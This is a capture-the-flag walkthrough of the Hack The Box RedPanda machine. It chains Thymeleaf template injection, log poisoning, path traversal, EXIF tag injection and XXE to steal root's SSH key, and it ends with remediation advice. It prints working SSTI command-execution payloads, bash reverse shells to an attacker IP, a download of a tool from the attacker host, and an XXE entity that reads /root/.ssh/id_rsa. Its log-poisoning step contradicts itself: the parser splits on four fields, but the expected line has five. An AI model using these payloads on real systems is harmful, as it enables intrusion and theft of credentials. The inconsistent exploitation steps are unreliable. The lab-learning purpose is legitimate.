# RedPanda: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen) ![OS](https://img.shields.io/badge/OS-Linux-blue) ![Category](https://img.shields.io/badge/Category-Web%20%2F%20Java-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| Machine Name | RedPanda |
| Difficulty | Easy |
| Platform | Hack The Box |
| Operating System | Linux (Ubuntu) |
| Category | Web Application / Java / Privilege Escalation |
| Key Vulnerability Chain | SSTI → Log Poisoning → Path Traversal → XXE → Root SSH Key |

---

## Overview

This writeup documents the solution for the **RedPanda** machine on Hack The Box, which demonstrates a sophisticated multi-stage exploitation chain combining Server-Side Template Injection, log poisoning, EXIF metadata manipulation, path traversal, and XML External Entity injection.

## Challenge Context

The RedPanda machine illustrates how **chaining individually minor misconfigurations** can lead to complete system compromise. No single vulnerability is catastrophic on its own: the power comes from chaining them into a full root escalation path.

**Key Demonstration:**

A root-owned cron job that blindly trusts log file contents, combined with a web application that reflects unsanitized user input, creates a chain where injecting data into a log file eventually triggers XXE execution as root, leaking the private SSH key.

## Learning Objectives

This lab teaches:

- Spring Boot SSTI detection and exploitation
- Log poisoning via User-Agent header injection
- Path traversal through Java path construction logic
- EXIF metadata manipulation with `exiftool`
- XML External Entity (XXE) injection for file read
- Understanding how cron jobs create privilege escalation paths
- Chaining multiple vulnerabilities into a full compromise

**Scenario:** Initial foothold via SSTI in a Java Spring Boot application, followed by a multi-step privilege escalation chain abusing a root cron job that processes attacker-controlled log data and XML files.

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Web Application Analysis](#web-application-analysis)
3. [SSTI Exploitation: Initial Foothold](#ssti-exploitation)
4. [Privilege Escalation: The Chain](#privilege-escalation)
   - [Step 1: Discover the Cron Job](#step-1-discover-the-cron-job)
   - [Step 2: Understand the Log Parser](#step-2-understand-the-log-parser)
   - [Step 3: Log Poisoning](#step-3-log-poisoning)
   - [Step 4: Path Traversal via URI](#step-4-path-traversal)
   - [Step 5: EXIF Artist → XML Path](#step-5-exif-artist-injection)
   - [Step 6: XXE to Steal id_rsa](#step-6-xxe-injection)
   - [Step 7: SSH as Root](#step-7-ssh-as-root)
5. [Flags](#flags)
6. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Network Enumeration

```bash
nmap -sC -sV -oA redpanda 10.129.x.x
```

**Nmap Results:**
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
8080/tcp open  http-proxy
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     ...
|     RedPanda Search | Made with Spring Boot
```

**Open Ports Identified:**
- **22/TCP**: SSH (OpenSSH 8.2p1)
- **8080/TCP**: HTTP (Spring Boot application)

✅ **Primary Attack Surface:** Spring Boot web application on port 8080

---

## Web Application Analysis

### Initial Access

```bash
curl http://10.129.x.x:8080/
```

**Browser:**
```
http://10.129.x.x:8080/
```

**Observation:**
- Search engine themed around red pandas
- Single input field accepting search queries
- Spring Boot confirmed via page footer

### Technology Fingerprinting

| Technology | Details |
|-----------|---------|
| Framework | Spring Boot (Java) |
| Template Engine | Thymeleaf |
| Language | Java |
| Port | 8080 |

### Testing Input Behavior

**Basic search:**
```
woodenk
```

**Response:** Returns artist profiles and panda images

**Observation:** User input is reflected directly on the results page: potential template injection vector.

---

## SSTI Exploitation

### Detecting Template Injection

**SSTI Probe: Spring Boot / Thymeleaf syntax:**
```
${7*7}
```

**Response:** Returns `49`

✅ **Confirmed:** SSTI vulnerability in search parameter

**Note:** Thymeleaf uses `${...}` for expression evaluation. When user input reaches the template renderer unsanitized, expressions execute server-side.

### Bypass Attempts

Some payloads are filtered. Testing alternatives:

```
*{7*7}        → 49  ✅
#{7*7}        → blocked ❌
${7*7}        → 49  ✅
```

### RCE via SSTI

**Payload to execute OS commands:**
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

**URL-encoded search request:**
```bash
curl -s "http://10.129.x.x:8080/search" \
  --data-urlencode "name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}"
```

**Response:**
```
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

✅ **RCE confirmed as user `woodenk`**

**Note the `logs` group: this becomes critical for privilege escalation.**

### Establish Reverse Shell

**Setup listener:**
```bash
nc -lvnp 4444
```

**Payload (write shell to /tmp then execute):**
```bash
# First: write the reverse shell
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"}).getInputStream())}
```

**Alternative: base64 encoded payload:**
```bash
# Encode locally
echo "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1" | base64

# Inject via SSTI
*{T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","echo BASE64HERE|base64 -d|bash"})}
```

**Shell received:**
```
bash-5.0$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

### User Flag

```bash
cat /home/woodenk/user.txt
```

---

## Privilege Escalation

### The Full Chain Overview

```
Log Poisoning (User-Agent injection)
          ↓
  Log Parser (root cron job)
          ↓
    Path Traversal (URI field)
          ↓
  Image in /tmp (attacker-controlled)
          ↓
   EXIF Artist → XML path
          ↓
   XXE in /tmp/hax_creds.xml
          ↓
    /root/.ssh/id_rsa leaked
          ↓
       SSH as root
```

---

### Step 1: Discover the Cron Job

**Check running processes:**
```bash
ps aux | grep root
```

**Check cron:**
```bash
cat /etc/crontab
ls /etc/cron*
```

**Using pspy to monitor processes (recommended):**
```bash
# Upload pspy64 to target
wget http://10.10.14.x:8000/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

**pspy output (every ~2 minutes):**
```
CMD: UID=0    PID=xxxx   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
```

✅ **Root cron job confirmed:** Java JAR runs as UID 0 every ~2 minutes

---

### Step 2: Understand the Log Parser

**Locate and examine the JAR:**
```bash
find / -name "*.java" 2>/dev/null | grep -i log
ls /opt/credit-score/LogParser/final/src/
```

**Key source file: `App.java` (simplified logic):**
```java
public static void main(String[] args) throws JDOMException, IOException {
    // Reads the log file
    File log = new File("/home/woodenk/panda_search/redpanda.log");
    Scanner scanner = new Scanner(log);

    while (scanner.hasNextLine()) {
        String line = scanner.nextLine();

        // Splits on "||" into 4 fields
        String[] fields = line.split("\\|\\|");
        // fields[0] = date
        // fields[1] = username
        // fields[2] = filename (author name)
        // fields[3] = uri  ← ATTACKER CONTROLLED

        String uri = fields[3];

        // Builds full path using uri directly
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;

        // Reads EXIF Artist from that image
        String artist = getArtist(fullpath);

        // Builds XML path from artist
        String xmlPath = "/credits/" + artist + "_creds.xml";

        // Parses the XML: XXE vulnerable
        addViewTo(xmlPath, fields[2]);
    }
}
```

**Critical observations:**
1. Log file is at `/home/woodenk/panda_search/redpanda.log`
2. `woodenk` (our user) can write to it (member of `logs` group)
3. `uri` (field 4) is appended to a static path: **path traversal possible**
4. EXIF `Artist` tag controls the XML path: **metadata injection possible**
5. XML is parsed without disabling external entities: **XXE possible**

---

### Step 3: Log Poisoning

**Understanding the log format:**

Normal log entry produced by the app:
```
200||woodenk||smooch.jpg||/img/smooch.jpg
```

**Goal:** Control the `uri` field (field 4) by injecting `||` into the User-Agent header.

**Inject via User-Agent:**
```bash
curl http://10.129.x.x:8080/ \
  -A "||||||/../../../../tmp/smooch.jpg"
```

**What gets written to the log:**
```
200||USER_AGENT_VALUE||author||/../../../../tmp/smooch.jpg
```

**More precise injection: craft complete log line:**

The web app logs requests in the format:
```
statusCode||userAgent||fileName||uri
```

Inject into User-Agent so the split produces the desired `uri`:
```bash
curl http://10.129.x.x:8080/ \
  -A "fakeagent||fakeauthor||fakefile||/../../../../tmp/smooch.jpg"
```

**Verify log entry was written:**
```bash
cat /home/woodenk/panda_search/redpanda.log
```

**Expected log line:**
```
200||fakeagent||fakeauthor||fakefile||/../../../../tmp/smooch.jpg
```

✅ **Log poisoned: `uri` now points to our image in `/tmp`**

---

### Step 4: Path Traversal

**Java path construction (vulnerable):**
```java
String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
```

**With our injected URI:**
```
/opt/panda_search/src/main/resources/static/../../../../tmp/smooch.jpg
```

**Java `File` resolves this to:**
```
/tmp/smooch.jpg
```

✅ **The cron job will now read EXIF data from our attacker-controlled image**

---

### Step 5: EXIF Artist Injection

**Understanding the Artist → XML path:**
```java
String artist = getArtist(fullpath);           // reads EXIF Artist tag
String xmlPath = "/credits/" + artist + "_creds.xml";
```

**Normal behavior:**
```
Artist = "woodenk"
xmlPath = "/credits/woodenk_creds.xml"
```

**Malicious behavior (our goal):**
```
Artist = "../tmp/hax"
xmlPath = "/credits/../tmp/hax_creds.xml"  →  /tmp/hax_creds.xml
```

### Prepare the Malicious JPEG

**Get or create a base JPEG:**
```bash
cp /opt/panda_search/src/main/resources/static/img/smooch.jpg /tmp/smooch.jpg
```

**Or create a minimal JPEG:**
```bash
wget http://10.10.14.x:8000/smooch.jpg -O /tmp/smooch.jpg
```

**Inject malicious Artist tag using exiftool:**
```bash
exiftool -Artist="../tmp/hax" /tmp/smooch.jpg
```

**Verify the tag was set:**
```bash
exiftool /tmp/smooch.jpg | grep Artist
```

**Expected output:**
```
Artist                          : ../tmp/hax
```

✅ **When the cron job reads this image:**
```
artist = "../tmp/hax"
xmlPath = "/credits/../tmp/hax_creds.xml"  →  /tmp/hax_creds.xml
```

---

### Step 6: XXE Injection

**Understanding the vulnerability:**

The Java XML parser processes `/tmp/hax_creds.xml` as root. If that file contains an XXE payload, the external entity resolves and leaks file contents.

### Craft the Malicious XML

```bash
cat > /tmp/hax_creds.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
]>
<credits>
  <author>hax</author>
  <image>
    <uri>/../../../../tmp/smooch.jpg</uri>
    <views>1</views>
    <root>&xxe;</root>
  </image>
</credits>
EOF
```

**Verify the file:**
```bash
cat /tmp/hax_creds.xml
```

**Set permissions:**
```bash
chmod 644 /tmp/hax_creds.xml
```

### Wait for Cron Execution (~2 minutes)

```bash
# Watch for the cron job to fire
watch -n 5 "ps aux | grep java"
```

**Or simply wait and then check for output:**
```bash
# The cron job writes results to an output XML
# Check where it writes:
find /credits -newer /tmp/hax_creds.xml 2>/dev/null
```

### Extract the SSH Key

**After cron fires, read the output:**
```bash
cat /credits/hax_creds.xml
# OR wherever the parser writes its output
```

**The XXE will have expanded `&xxe;` to the contents of `/root/.ssh/id_rsa`:**
```xml
<credits>
  <author>hax</author>
  <image>
    <uri>/../../../../tmp/smooch.jpg</uri>
    <views>1</views>
    <root>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
...
-----END OPENSSH PRIVATE KEY-----
</root>
  </image>
</credits>
```

✅ **Root's private SSH key extracted via XXE**

---

### Step 7: SSH as Root

**Extract and save the private key:**
```bash
# Copy the key content from the XML output
cat > /tmp/id_rsa << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[paste key content here]
-----END OPENSSH PRIVATE KEY-----
EOF
```

**Fix permissions (SSH requires strict perms):**
```bash
chmod 600 /tmp/id_rsa
```

**Verify key format:**
```bash
head -1 /tmp/id_rsa
# Should be: -----BEGIN OPENSSH PRIVATE KEY-----

tail -1 /tmp/id_rsa
# Should be: -----END OPENSSH PRIVATE KEY-----
```

**Common formatting issue: ensure no trailing spaces or broken lines:**
```bash
cat -A /tmp/id_rsa | head -5
# Verify no ^M (Windows line endings) or extra whitespace
```

**SSH as root:**
```bash
ssh -i /tmp/id_rsa root@127.0.0.1
```

**Shell received:**
```
root@redpanda:~#
```

✅ **Root access achieved**

---

## Flags

### User Flag

```bash
cat /home/woodenk/user.txt
```

**Flag:** `[redacted]`

### Root Flag

```bash
cat /root/root.txt
```

**Flag:** `[redacted]`

---

## Full Attack Chain Summary

```
Nmap Scan → Port 8080 (Spring Boot)
              ↓
     SSTI Detection (${7*7} → 49)
              ↓
  Thymeleaf RCE via *{Runtime.exec()}
              ↓
  Shell as woodenk (member of 'logs' group)
              ↓
   pspy → root cron job every 2 min
    (java -jar LogParser.jar)
              ↓
  Source analysis → log format: status||ua||author||uri
              ↓
    Log Poisoning via User-Agent header
    (inject: ||attacker||fake||/../../../../tmp/smooch.jpg)
              ↓
     Path Traversal in Java path construction
     (/opt/static/ + ../../../../tmp/smooch.jpg → /tmp/smooch.jpg)
              ↓
   EXIF Artist injection via exiftool
   (Artist = "../tmp/hax")
              ↓
   XML path: /credits/../tmp/hax_creds.xml → /tmp/hax_creds.xml
              ↓
   XXE payload placed at /tmp/hax_creds.xml
   (<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">)
              ↓
   Cron fires → root parses XML → entity expands
              ↓
   id_rsa written into output XML
              ↓
   chmod 600 /tmp/id_rsa
              ↓
   ssh -i /tmp/id_rsa root@127.0.0.1
              ↓
         ROOT ✅
```

---

## Key Takeaways

### Technical Lessons

1. **SSTI in Java / Thymeleaf**
   - Spring Boot + Thymeleaf uses `${...}` and `*{...}` for expressions
   - Direct reflection of user input into templates = RCE
   - `T()` syntax accesses Java classes, including `Runtime`
   - Test with `*{7*7}`: if it returns `49`, it's vulnerable

2. **Log Poisoning**
   - Logs that are later parsed by privileged processes are attack vectors
   - User-Agent, Referer, and X-Forwarded-For are common injection points
   - Delimiter injection (`||`, `,`, `\t`) can shift parsed fields
   - If a privileged process reads your data → you influence its behavior

3. **Path Traversal in Java**
   - String concatenation for file paths is dangerous
   - `new File("/base/" + userInput)` doesn't sanitize `../`
   - `File.getCanonicalPath()` resolves traversals: use it
   - Always validate that resolved paths start with expected prefix

4. **EXIF Metadata as an Attack Vector**
   - JPEG/PNG metadata fields are attacker-controlled
   - Applications that trust metadata for path/query construction are vulnerable
   - `exiftool` is the standard tool for metadata manipulation
   - Always sanitize and validate data read from file metadata

5. **XXE Injection**
   - Java XML parsers (SAX, DOM, JDOM) enable external entities by default
   - `file://` URIs read local files
   - `http://` URIs can cause SSRF
   - When parsed as root, XXE = arbitrary file read as root

6. **Cron Job Attack Surface**
   - Root-run cron jobs that process attacker-influenced data are critical vulnerabilities
   - Check cron job file paths for write permissions
   - `pspy` is essential for discovering cron activity without root
   - The `groups` output (`logs` group) was the first hint

### Enumeration Best Practices

✅ **Do:**
- Note your group memberships immediately after shell (`id`)
- Run `pspy` early: cron jobs are often the escalation path
- Read source code of discovered JAR/scripts before crafting exploits
- Understand data flow: where does your input end up?
- Test injection in every HTTP header, not just form fields

❌ **Don't:**
- Overlook unusual group memberships (`logs`, `docker`, `disk`)
- Skip process monitoring: cron jobs are invisible without pspy
- Rush payloads: understand the full chain before triggering
- Forget to fix SSH key formatting after extracting from XML
- Assume metadata fields are sanitized

### Vulnerability Classes Chained

| Step | Vulnerability | Impact |
|------|--------------|--------|
| 1 | SSTI (Thymeleaf) | Initial RCE as `woodenk` |
| 2 | Log Poisoning (User-Agent) | Control log data read by root |
| 3 | Path Traversal (URI field) | Point cron to attacker-controlled file |
| 4 | EXIF Metadata Injection | Control XML file path |
| 5 | XXE Injection | Read `/root/.ssh/id_rsa` |
| 6 | Weak SSH Key Protection | SSH login as root |

---

## Tools Used

| Tool | Purpose | Key Usage |
|------|---------|-----------|
| `nmap` | Port scanning | `-sC -sV` |
| `curl` | HTTP requests & injection | `-A` for User-Agent |
| `pspy64` | Process monitoring | Discover root cron |
| `exiftool` | EXIF metadata manipulation | `-Artist=` injection |
| `nc` | Reverse shell listener | `-lvnp 4444` |
| `ssh` | Root login | `-i id_rsa` |

---

## Remediation

### For Developers

1. **Prevent SSTI: Never render user input as templates**
   ```java
   // VULNERABLE
   return "search?query=" + userInput; // reflected into template

   // SECURE: pass as model attribute, not template expression
   model.addAttribute("query", userInput);
   return "results";
   ```

2. **Sanitize Log Entries**
   ```java
   // VULNERABLE
   log.write(userAgent + "||" + uri);

   // SECURE: strip delimiter characters
   String safeUA = userAgent.replaceAll("[|\\\\]", "");
   log.write(safeUA + "||" + uri);
   ```

3. **Validate File Paths**
   ```java
   // VULNERABLE
   String fullpath = BASE_PATH + uri;

   // SECURE: canonicalize and validate prefix
   File resolved = new File(BASE_PATH + uri).getCanonicalFile();
   if (!resolved.getPath().startsWith(BASE_PATH)) {
       throw new SecurityException("Path traversal detected");
   }
   ```

4. **Disable XXE in XML Parsers**
   ```java
   // SECURE: disable external entities in JDOM/SAX
   SAXBuilder saxBuilder = new SAXBuilder();
   saxBuilder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   saxBuilder.setFeature("http://xml.org/sax/features/external-general-entities", false);
   saxBuilder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

5. **Sanitize Metadata Before Use**
   ```java
   // VULNERABLE
   String artist = getExifArtist(file); // trusts raw metadata
   String xmlPath = "/credits/" + artist + "_creds.xml";

   // SECURE: whitelist validation
   if (!artist.matches("[a-zA-Z0-9_]+")) {
       throw new SecurityException("Invalid artist name");
   }
   ```

### For System Administrators

1. **Principle of Least Privilege for Cron Jobs**
   - Never run parsing/processing scripts as root
   - Use dedicated service accounts
   - Drop privileges before processing user-influenced data

2. **File Permission Hardening**
   - Log files written by web apps should not be readable by cron parsers
   - Use separate log directories with strict permissions
   - Audit who can write to files read by privileged processes

3. **Restrict SSH Key Access**
   - Keep root login disabled (`PermitRootLogin no`)
   - Use key-based auth with passphrase
   - Monitor `/root/.ssh/` for unauthorized access

---

## References

- [PortSwigger: SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [Thymeleaf SSTI Research](https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability)
- [OWASP: XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [exiftool Documentation](https://exiftool.org/)
- [pspy: Process Monitor](https://github.com/DominicBreuker/pspy)
- [HackTricks: SSTI Java](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)

---

**Machine Pwned:** ✅  
**Difficulty Rating:** Easy (but chain is Medium-level thinking)  
**Real-World Relevance:** Very High (log injection + XXE common in enterprise Java apps)  
**Learning Value:** Exceptional: teaches multi-stage chaining methodology
